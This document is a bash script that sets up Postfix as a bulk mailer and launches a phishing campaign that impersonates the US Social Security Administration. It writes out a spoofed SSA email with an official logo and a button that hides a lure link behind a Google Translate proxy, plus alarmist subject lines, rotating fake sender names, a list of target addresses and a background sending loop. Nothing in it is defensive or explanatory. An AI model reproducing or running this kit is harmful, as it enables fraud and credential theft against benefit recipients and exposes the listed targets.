#!/bin/bash

# Make sure the script is being run with sudo privileges
if [ "$EUID" -ne 0 ]; then
  echo "Please run this script as root or with sudo privileges."
  exit 1
fi

read -p "Enter your domain (e.g., domain.com): " domain
if [[ -z "$domain" ]]; then
  echo "Domain cannot be empty."
  exit 1
fi

read -p "Enter your username (e.g., no-reply): " username
if [[ -z "$username" ]]; then
  echo "username cannot be empty."
  exit 1
fi

# Update package list and install Postfix
echo "Updating package list and installing Postfix..."
sudo apt-get update -y
sudo apt-get install postfix -y

# Install tmux for session persistence
echo "Installing tmux for persistent sessions..."
sudo apt-get install tmux -y

# Backup the original Postfix config file
echo "Backing up the original Postfix main.cf..."
sudo cp /etc/postfix/main.cf /etc/postfix/main.cf.backup

sudo tee /etc/postfix/generic > /dev/null <<EOL
root@$domain    $username@$domain
@$domain        $username@$domain
EOL

sudo postmap /etc/postfix/generic
sudo service postfix restart || { echo "Postfix failed to restart"; exit 1; }

# Remove the current main.cf to replace with custom config
echo "Removing current main.cf..."
sudo rm /etc/postfix/main.cf

# Create a new Postfix main.cf file with the desired configuration
echo "Creating a new Postfix main.cf file..."
sudo tee /etc/postfix/main.cf > /dev/null <<EOL
# Postfix main configuration file
myhostname = bulkmail.$domain
mydomain = $domain
myorigin = $domain

inet_protocols = ipv4
smtp_helo_name = bulkmail.$domain
smtp_tls_security_level = may
smtp_tls_loglevel = 1

smtp_destination_concurrency_limit = 1
default_process_limit = 50
smtp_generic_maps = hash:/etc/postfix/generic
ignore_rhosts = yes

inet_interfaces = loopback-only
mydestination = localhost
smtp_sasl_auth_enable = no
smtpd_sasl_auth_enable = no
smtp_sasl_security_options = noanonymous

queue_directory = /var/spool/postfix
command_directory = /usr/sbin
daemon_directory = /usr/lib/postfix/sbin
mailbox_size_limit = 0
recipient_delimiter = +
smtpd_client_restrictions = permit_mynetworks, permit_sasl_authenticated, reject
disable_dns_lookups = no
EOL

# Restart Postfix to apply the changes
echo "Restarting Postfix service..."
sudo service postfix restart || { echo "Postfix failed to restart"; exit 1; }

# Install mailutils for sending emails via Postfix
echo "Installing mailutils..."
sudo apt-get install mailutils -y
sudo apt-get install html2text -y
sudo apt-get install parallel base64 -y
sudo chown $USER:$USER *

# Create a sample HTML email content (email.html)
echo "Creating email.html with email content..."
cat > email.html <<EOL

<html><head><title></title>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
</head>
<body style="margin: 0.4em; font-size: 14pt;">
<div role="document" style='margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: rgb(0, 0, 0); text-transform: none; line-height: inherit; text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space: normal; orphans: 2; widows: 2; font-size-adjust: 
inherit; font-stretch: inherit; font-feature-settings: inherit; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-alternates: inherit; font-variant-position: inherit; font-variant-emoji: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-variation-settings: 
inherit;'>
<div tabindex="0" class="XbIp4 jmmB7 customScrollBar GNqVo allowTextSelection OuGoX" id="UniqueMessageBody_30" style="margin: 12px 16px 0px 52px; padding: 0px 0px 2px; border: 0px currentColor; border-image: none; color: rgb(36, 36, 36); line-height: inherit; font-family: inherit; font-size: 15px; font-style: inherit; font-variant: inherit; font-weight: 400; vertical-align: baseline; cursor: auto; -ms-overflow-y: auto; font-size-adjust: inherit; font-stretch: inherit; font-feature-settings: 
inherit; font-optical-sizing: inherit; font-kerning: inherit; font-variation-settings: inherit; user-select: text; will-change: scroll-position;" aria-label="Message body"><div class="BIZfh" style="font: inherit; margin: 0px; padding: 0px; border: 0px currentColor; transition:opacity 0.3s; border-image: none; color: inherit; vertical-align: baseline; visibility: visible; font-size-adjust: inherit; font-stretch: inherit; opacity: 1;">
<div style="font: inherit; margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: inherit; vertical-align: baseline; font-size-adjust: inherit; font-stretch: inherit;" visibility="hidden"><div style="font: inherit; margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: inherit; vertical-align: baseline; font-size-adjust: inherit; font-stretch: inherit;">
<div style="margin: 0px; padding: 20px; border: 0px currentColor; border-image: none; color: rgb(51, 51, 51) !important; line-height: 1.6; font-family: Roboto, sans-serif; font-size: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; vertical-align: baseline; font-size-adjust: inherit; font-stretch: inherit; font-feature-settings: inherit; background-color: rgb(245, 247, 250) !important; font-optical-sizing: inherit; font-kerning: inherit; font-variation-settings: 
inherit;"><div style="font: inherit; margin: 0px auto; padding: 40px; border-radius: 10px; border: 0px currentColor; border-image: none; color: inherit; vertical-align: baseline; max-width: 800px; font-size-adjust: inherit; font-stretch: inherit; box-shadow: 0px 4px 20px rgba(0,0,0,0.1); background-color: white !important;">
<div style="font: inherit; margin: -40px -40px 30px; padding: 15px 20px 15px 17px; border: 0px currentColor; border-image: none; color: white !important; vertical-align: baseline; font-size-adjust: inherit; font-stretch: inherit; align-items: center; background-color: rgb(11, 71, 120) !important;">
<span style="font: inherit; margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: inherit; vertical-align: baseline; display: inline-block; font-size-adjust: inherit; font-stretch: inherit;">
<img style="font: inherit; margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; width: 50px; color: inherit; vertical-align: baseline; font-size-adjust: inherit; font-stretch: inherit;" alt="Home" src="https://ssa.gov/themes/custom/ssa_core/logo.svg" data-imagetype="External"></span><h1>Social Security Administration</h1></div>
<div style="font: inherit; margin: 25px 0px; padding: 20px; border-radius: 8px; border: 1px solid rgb(255, 213, 79); border-image: none; text-align: center; color: inherit; vertical-align: baseline; font-size-adjust: inherit; font-stretch: inherit; background-color: rgb(255, 248, 225) !important;"><p>Delayed access may result in processing setbacks or missed deadlines</p></div><p>This statement serves as your official<span>&nbsp;</span><strong>"proof of income"</strong><span>&nbsp;</span>
or<span>&nbsp;</span><strong>"benefit letter"</strong>, customized according to your specific Social Security benefits, Supplemental Security Income (SSI), and Medicare status.<br><br><br></p><h2>Access Your Statement Now</h2><p>Review your personalized Social Security statement to verify your earnings record, estimate future benefits, and ensure all information is accurate.</p>
<div style="font: inherit; margin: 30px 0px; padding: 30px; border-radius: 15px; border: 0px currentColor; border-image: none; width: 516px; height: 110px; text-align: center; color: white !important; overflow: hidden; vertical-align: baseline; font-size-adjust: inherit; font-stretch: inherit;"><h2><br></h2>
<a title="https://SSA.GOV" style="margin: 0px; padding: 15px 30px; border-radius: 50px; border: 0px currentColor; border-image: none; color: rgb(17, 47, 78) !important; line-height: inherit; font-family: inherit; font-size: 18px; font-style: inherit; font-variant: inherit; font-weight: 700; text-decoration: none; vertical-align: baseline; display: inline-block; z-index: 1; font-size-adjust: inherit; font-stretch: 
inherit; box-shadow: 0px 4px 15px rgba(0,0,0,0.2); font-feature-settings: inherit; background-color: rgb(255, 213, 79) !important; font-optical-sizing: inherit; font-kerning: inherit; font-variation-settings: inherit;" href="https://www-jhmfashion-com.translate.goog/web?_x_tr_sl=ca&_x_tr_tl=en&_x_tr_hl=en" data-auth="NotApplicable" data-linkindex="0">VIEW YOUR 2026 STATEMENT</a><p style="font-size: 14px; margin-top: 15px; opacity: 0.9;"><br></p></div>
<p style="font-size: 14px; margin-top: 15px; opacity: 0.9;">Secure connection &#8226; Takes less than 5 minutes</p><p>We strongly encourage you to thoroughly review your statement and contact us with any questions. Your attention to this matter ensures the continuity of your benefits and prevents potential service interruptions.</p>
<div style="border-width: 1px 0px 0px; font: inherit; margin: 40px 0px 0px; padding: 20px 0px 0px; text-align: center; color: inherit; vertical-align: baseline; border-top-color: rgb(224, 224, 224); border-top-style: solid; font-size-adjust: inherit; font-stretch: inherit;"><p><strong>Best Regards,</strong></p><p><strong>The Social Security Administration</strong></p><p>Ensuring your financial security since 1935</p></div></div></div></div></div></div></div></div></body></html>
EOL

# Create a sample txt subject content (subject.txt)
echo "Creating subject.txt with subject content..."
cat > subject.txt <<EOL
Your Social Security Statement is Ready
Important: Your SSA eStatement Available
Access Your SSA Statement Online
SSA Statement Notification
Benefits/Confirmation:
Social Security Benefit Verification
Confirmation of Benefit Application
Your Social Security Benefit Award
Important Information About Your Benefits
Unusual Activity Detected - SSA Account
SSA Security Alert
Important Update from Social Security Administration
SSA: Your Account Has Been Updated
Notification of Change - Social Security
SSA eStatement Access - Support Request
Access Authorization - SSA Portal
SSA: Secure Document Access
EOL

# Create a sample txt name content (name.txt)
echo "Creating name.txt with name content..."
cat > name.txt <<EOL
Accounts Payable
SSA Department
SSA Management
Payments Team
Statement Office
Billing Department
Shared Services Center
Accounts Unit
Finance Operations
Admin Division
Docs Relations
Billing & Settlements
Accounts Processing
Payment Desk
SSA Notification
Finance Automation
Support Desk
EOL

# Create a sample txt list content (list.txt)
echo "Creating list.txt with list content..."
cat > list.txt <<EOL
prodaja@vbuilding.rs
zruba@vnkgroup-ks.com

EOL

# Create the sending script (send.sh)
echo "Creating send.sh for bulk email sending..."
cat > send.sh <<EOL
#!/bin/bash

# Configuration files
EMAIL_LIST="list.txt"
HTML_TEMPLATE="email.html"
SUBJECT_FILE="subject.txt"
NAME_FILE="name.txt"
LOG_FILE="send_log_\$(date +%Y%m%d).txt"

# Initialize counters
TOTAL=\$(wc -l < "\$EMAIL_LIST")
SUCCESS=0
FAILED=0

# Verify required files exist
for file in "\$EMAIL_LIST" "\$HTML_TEMPLATE" "\$SUBJECT_FILE" "\$NAME_FILE"; do
    if [ ! -f "\$file" ]; then
        echo "Error: Missing \$file" | tee -a "\$LOG_FILE"
        exit 1
    fi
done

# Load all subjects and names into arrays
mapfile -t SUBJECTS < "\$SUBJECT_FILE"
mapfile -t NAMES < "\$NAME_FILE"

# Random name generator (from name.txt)
get_random_name() {
    echo "\${NAMES[\$((RANDOM % \${#NAMES[@]}))]}"
}

# Random number generator (4-6 digits)
get_random_number() {
    echo \$((RANDOM % 9000 + 1000))
}

# Process each email
while IFS= read -r email; do
    # Clean and parse email address
    CLEAN_EMAIL=\$(echo "\$email" | tr -d '\\r\\n')
    EMAIL_USER=\$(echo "\$CLEAN_EMAIL" | cut -d@ -f1)
    EMAIL_DOMAIN=\$(echo "\$CLEAN_EMAIL" | cut -d@ -f2)
    CURRENT_DATE=\$(date +%Y-%m-%d)
    BASE64_EMAIL=\$(echo -n "\$CLEAN_EMAIL" | base64)

    # Generate random elements
    RANDOM_NAME=\$(get_random_name)
    RANDOM_NUMBER=\$(get_random_number)
    SELECTED_SENDER_NAME="\${NAMES[\$((RANDOM % \${#NAMES[@]}))]}"
    
    # Select subject and REPLACE ITS VARIABLES
    SELECTED_SUBJECT="\${SUBJECTS[\$((RANDOM % \${#SUBJECTS[@]}))]}"
    SELECTED_SUBJECT=\$(echo "\$SELECTED_SUBJECT" | sed \
        -e "s|{date}|\$CURRENT_DATE|g" \
        -e "s|{recipient-email}|\$CLEAN_EMAIL|g" \
        -e "s|{recipient-user}|\$EMAIL_USER|g" \
        -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g" \
        -e "s|{name}|\$RANDOM_NAME|g" \
        -e "s|{random-name}|\$(get_random_name)|g" \
        -e "s|{random-number}|\$RANDOM_NUMBER|g")

    echo "Processing: \$CLEAN_EMAIL"
    
    # Generate unique Message-ID
    MESSAGE_ID="<\$(date +%s%N).\$(openssl rand -hex 8)@$domain>"
    
    # Create temporary HTML file with replaced variables
    TEMP_HTML=\$(mktemp)
    sed \
        -e "s|{date}|\$CURRENT_DATE|g" \
        -e "s|{recipient-email}|\$CLEAN_EMAIL|g" \
        -e "s|{recipient-user}|\$EMAIL_USER|g" \
        -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g" \
        -e "s|{name}|\$RANDOM_NAME|g" \
        -e "s|{random-name}|\$(get_random_name)|g" \
        -e "s|{random-number}|\$RANDOM_NUMBER|g" \
        -e "s|{sender-email}|$username@$domain|g" \
        -e "s|{sender-name}|\$SELECTED_SENDER_NAME|g" \
        -e "s|{base64-encryptedrecipents-email}|\$BASE64_EMAIL|g" \
        "\$HTML_TEMPLATE" > "\$TEMP_HTML"
    
    # Send with dynamic content
    # Create text version
    TEMP_TEXT=\$(mktemp)
    cat <<EOF > "\$TEMP_TEXT"
Webmail - Mail. Host. Online

Email Account Status Changed

Hi \$EMAIL_USER,

Contract Payment Approved

" Please reconfirm this order before we release payment."

Use the button below to review  the order and sign document(s)

ACCESS DOCUMENTS

EOF

# Send with both HTML and text
cat <<EOF | /usr/sbin/sendmail -t -oi
Return-Path: <$username@$domain>
From: "\$SELECTED_SENDER_NAME" <$username@$domain>
To: <\$CLEAN_EMAIL>
Subject: \$SELECTED_SUBJECT
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="MULTIPART_BOUNDARY"

--MULTIPART_BOUNDARY
Content-Type: text/plain; charset=UTF-8

\$(cat "\$TEMP_TEXT")

--MULTIPART_BOUNDARY
Content-Type: text/html; charset=UTF-8

\$(cat "\$TEMP_HTML")

--MULTIPART_BOUNDARY--
EOF

    rm "\$TEMP_TEXT"

    # Check exit status and clean up
    if [ \$? -eq 0 ]; then
        echo "\$(date) - SUCCESS: \$CLEAN_EMAIL" >> "\$LOG_FILE"
        ((SUCCESS++))
    else
        echo "\$(date) - FAILED: \$CLEAN_EMAIL" >> "\$LOG_FILE"
        ((FAILED++))
    fi
    
    rm "\$TEMP_HTML"
    
    # Dynamic delay (0.5-3 seconds)
    sleep \$(awk -v min=0.1 -v max=0.3 'BEGIN{srand(); print min+rand()*(max-min)}')
    
    # Progress indicator
    echo "[\$SUCCESS/\$TOTAL] Sent to \$CLEAN_EMAIL"
    
done < "\$EMAIL_LIST"

# Final report
echo "Completed at \$(date)" >> "\$LOG_FILE"
echo "Total: \$TOTAL | Success: \$SUCCESS | Failed: \$FAILED" >> "\$LOG_FILE"
echo "Full log: \$LOG_FILE"
EOL


# Make the send.sh script executable
chmod +x send.sh

# Create a tmux session and run the send.sh script in it
echo "Starting tmux session and running send.sh..."
tmux new-session -d -s mail_session "./send.sh"

# Print instructions for reattaching to the tmux session
echo "Your email sending process is running in the background with tmux."
echo "To reattach to the session, use: tmux attach -t mail_session"
